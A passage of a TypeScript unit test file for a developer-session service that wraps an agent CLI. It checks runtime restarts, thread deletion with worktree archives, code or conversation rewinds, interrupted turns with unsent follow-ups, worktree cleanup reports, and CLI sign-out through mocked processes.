    expect(spawn).toHaveBeenCalledTimes(1);
    expect(
      children[0]?.written.filter((entry) => entry.method === 'worktree/keep').map((e) => e.params),
    ).toEqual([{}, { keep: 4 }]);
  });

  it('starts a fresh runtime after one exits, and says the old one stopped', async () => {
    const { service, children, events, spawn } = await loadService();
    await service.listDeveloperSessions();

    children[0]?.emit('exit', 1, null);
    const transcript = await service.readDeveloperSession(root.id, thread.id);

    expect(events.at(-1)?.event).toMatchObject({ type: 'runtime-stopped' });
    expect(spawn).toHaveBeenCalledTimes(2);
    expect(transcript.session.id).toBe('thread-1');
    expect(transcript.messages).toHaveLength(2);
  });

  it('deletes a session keeping worktree archives unless asked, and relays what it did', async () => {
    const { service, children } = await loadService((method, params) =>
      method === 'thread/delete'
        ? {
            acknowledged: true,
            keptWorktreeArchives: params['discardWorktreeArchives'] ? [] : ['refs/agi/archive/a1'],
            removedWorktreeArchives: params['discardWorktreeArchives']
              ? ['refs/agi/archive/a1']
              : [],
            releasedWorktrees: ['a1b2c3d4'],
          }
        : defaultResponder(method),
    );

    const kept = await service.deleteDeveloperThread({ rootId: root.id, threadId: thread.id });
    const discarded = await service.deleteDeveloperThread({
      rootId: root.id,
      threadId: thread.id,
      discardWorktreeArchives: true,
    });

    const sent = children[0]?.written.filter((entry) => entry.method === 'thread/delete');
    expect(sent?.map((entry) => entry.params)).toEqual([
      { threadId: thread.id },
      { threadId: thread.id, discardWorktreeArchives: true },
    ]);
    expect(kept).toEqual({
      acknowledged: true,
      keptWorktreeArchives: ['refs/agi/archive/a1'],
      removedWorktreeArchives: [],
      releasedWorktrees: ['a1b2c3d4'],
    });
    expect(discarded.removedWorktreeArchives).toEqual(['refs/agi/archive/a1']);
  });

  it('reads a CLI that answers a delete with acknowledged alone as nothing kept or released', async () => {
    const { service } = await loadService((method) =>
      method === 'thread/delete' ? { acknowledged: true } : defaultResponder(method),
    );

    await expect(
      service.deleteDeveloperThread({ rootId: root.id, threadId: thread.id }),
    ).resolves.toEqual({
      acknowledged: true,
      keptWorktreeArchives: [],
      removedWorktreeArchives: [],
      releasedWorktrees: [],
    });
  });

  it('refuses a delete the CLI did not acknowledge', async () => {
    const { service } = await loadService((method) =>
      method === 'thread/delete' ? {} : defaultResponder(method),
    );

    await expect(
      service.deleteDeveloperThread({ rootId: root.id, threadId: thread.id }),
    ).rejects.toThrow(/did not say it deleted/u);
  });

  it('carries the large files a rewind left alone, and omits them when the CLI names none', async () => {
    let skipped: string[] | undefined = ['assets/model.bin'];
    const { service } = await loadService((method) =>
      method === 'thread/revert'
        ? {
            preview: true,
            files: ['src/a.ts'],
            messagesRemoved: 2,
            ...(skipped ? { skippedFiles: skipped } : {}),
          }
        : defaultResponder(method),
    );
    const request = { rootId: root.id, threadId: thread.id, turnId: 'turn-1', preview: true };

    expect((await service.revertDeveloperThread(request)).skippedFiles).toEqual([
      'assets/model.bin',
    ]);
    skipped = undefined;
    expect(await service.revertDeveloperThread(request)).not.toHaveProperty('skippedFiles');
  });

  it('names the restore only when it is not both, so an older CLI rewinds as it always did', async () => {
    const { service, children } = await loadService((method) => {
      if (method === 'initialize') {
        return { ...HANDSHAKE, capabilities: { ...HANDSHAKE.capabilities, revertRestore: true } };
      }
      return method === 'thread/revert'
        ? { preview: true, files: ['src/a.ts'], messagesRemoved: 0 }
        : defaultResponder(method);
    });
    const request = { rootId: root.id, threadId: thread.id, turnId: 'turn-1', preview: true };

    await service.revertDeveloperThread({ ...request, restore: 'code' });
    await service.revertDeveloperThread({ ...request, restore: 'both' });
    const reverts = children[0]?.written.filter((entry) => entry.method === 'thread/revert');

    expect(reverts?.[0]?.params).toMatchObject({ restore: 'code', preview: true });
    expect(reverts?.[1]?.params).not.toHaveProperty('restore');
  });

  it('refuses a code-only rewind before sending it to a CLI that would rewind both', async () => {
    const { service, children } = await loadService((method) =>
      method === 'thread/revert'
        ? { preview: true, files: ['src/a.ts'], messagesRemoved: 2 }
        : defaultResponder(method),
    );
    const request = { rootId: root.id, threadId: thread.id, turnId: 'turn-1', preview: true };

    await service.revertDeveloperThread(request);
    await expect(
      service.revertDeveloperThread({ ...request, restore: 'conversation' }),
    ).rejects.toThrow();
    expect(children[0]?.written.filter((entry) => entry.method === 'thread/revert')).toHaveLength(
      1,
    );
  });

  it('says how many steered follow-ups a stopped turn never read, and nothing when it read them all', async () => {
    const { service, children, events } = await loadService();

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'ping' });
    children[0]?.notify('turn/interrupted', {
      threadId: thread.id,
      turnId: 'turn-1',
      status: 'interrupted',
      unsentSteers: 2,
    });
    expect(events.at(-1)?.event).toMatchObject({
      type: 'turn-finished',
      outcome: 'interrupted',
      unsentSteers: 2,
    });

    children[0]?.notify('turn/completed', {
      threadId: thread.id,
      turnId: 'turn-1',
      status: 'completed',
      response: 'done',
    });
    expect(events.at(-1)?.event).not.toHaveProperty('unsentSteers');
  });

  it('opens the session in its new worktree and reports the older ones cleanup left', async () => {
    const worktree = {
      id: 'a1b2c3d4',
      path: '/worktrees/a1b2c3d4/checkout',
      start: { kind: 'ref', name: 'HEAD' },
    };
    const { service } = await loadService((method) =>
      method === 'worktree/create'
        ? {
            worktree,
            copiedFiles: [],
            refusedFiles: [],
            archived: [],
            cleanupFailures: [
              { worktreeId: 'deadbeef', reason: 'the checkout is locked' },
              { worktreeId: '', reason: 'worktrees could not be listed' },
              { reason: '' },
            ],
          }
        : defaultResponder(method),
    );

    const started = await service.startDeveloperSession(root.id, undefined, {
      environment: 'worktree',
      worktreeStart: 'head',
    });

    expect(started.id).toBe('thread-new');
    expect(started.rootId).toBe(`${root.id}::worktree::a1b2c3d4`);
    expect(started.cleanupFailures).toEqual([
      { worktreeId: 'deadbeef', reason: 'the checkout is locked' },
      { worktreeId: '', reason: 'worktrees could not be listed' },
    ]);
  });

  it('starts a worktree session with no cleanup report when the CLI sends none', async () => {
    const { service } = await loadService((method) =>
      method === 'worktree/create'
        ? {
            worktree: {
              id: 'a1b2c3d4',
              path: '/worktrees/a1b2c3d4/checkout',
              start: { kind: 'ref', name: 'HEAD' },
            },
            copiedFiles: [],
            refusedFiles: [],
            archived: [],
          }
        : defaultResponder(method),
    );

    const started = await service.startDeveloperSession(root.id, undefined, {
      environment: 'worktree',
    });

    expect(started).not.toHaveProperty('cleanupFailures');
  });
});

describe('a sign-out with no app-server running', () => {
  it('signs this machine out through the CLI when the shell is what signed it in', async () => {
    shellSignedCliIn.mockReturnValue(true);
    const { service, spawn, children } = await loadService(defaultResponder, {
      readShellIdentity: async () => ({ signedIn: false, email: null }),
      approveDeviceCode: async () => undefined,
    });

    const pending = service.syncDeveloperAccounts();
    await vi.waitFor(() =>
      expect(spawn).toHaveBeenCalledWith('/Users/qa/.cargo/bin/agi', ['logout'], expect.anything()),
    );
    children.at(-1)?.emit('exit', 0, null);
    await pending;

    expect(spawn).toHaveBeenCalledExactlyOnceWith(
      '/Users/qa/.cargo/bin/agi',
      ['logout'],
      expect.objectContaining({
        env: expect.objectContaining({ AGIWORKFORCE_API_BASE: 'http://localhost:3100' }),
      }),
    );
    expect(rememberShellSignedCliIn).toHaveBeenLastCalledWith(false);
    expect((await service.readDeveloperRuntimeStatus()).accountSyncError).toBeNull();
  });

  it('starts nothing when this shell never signed the machine in', async () => {
    shellSignedCliIn.mockReturnValue(false);
    const { service, spawn } = await loadService(defaultResponder, {
      readShellIdentity: async () => ({ signedIn: false, email: null }),
      approveDeviceCode: async () => undefined,
    });

    await service.syncDeveloperAccounts();

    expect(spawn).not.toHaveBeenCalled();
    expect(rememberShellSignedCliIn).not.toHaveBeenCalled();
  });

  it('leaves the machine alone when the shell is still signed in', async () => {
    shellSignedCliIn.mockReturnValue(true);
    const { service, spawn } = await loadService(defaultResponder, {
      readShellIdentity: async () => ({ signedIn: true, email: 'qa@agiworkforce.com' }),
      approveDeviceCode: async () => undefined,
    });

    await service.syncDeveloperAccounts();

    expect(spawn).not.toHaveBeenCalled();
  });

  it('says so on the CLI row when the sign-out fails', async () => {
    shellSignedCliIn.mockReturnValue(true);
    const { service, spawn, children } = await loadService(defaultResponder, {
      readShellIdentity: async () => ({ signedIn: false, email: null }),
      approveDeviceCode: async () => undefined,
    });

    const pending = service.syncDeveloperAccounts();
    await vi.waitFor(() =>
      expect(spawn).toHaveBeenCalledWith('/Users/qa/.cargo/bin/agi', ['logout'], expect.anything()),
    );
    children.at(-1)?.emit('exit', 3, null);
    await pending;

    expect((await service.readDeveloperRuntimeStatus()).accountSyncError).toContain(
      'could not sign this computer out',
    );
    expect(rememberShellSignedCliIn).not.toHaveBeenCalled();
  });
});
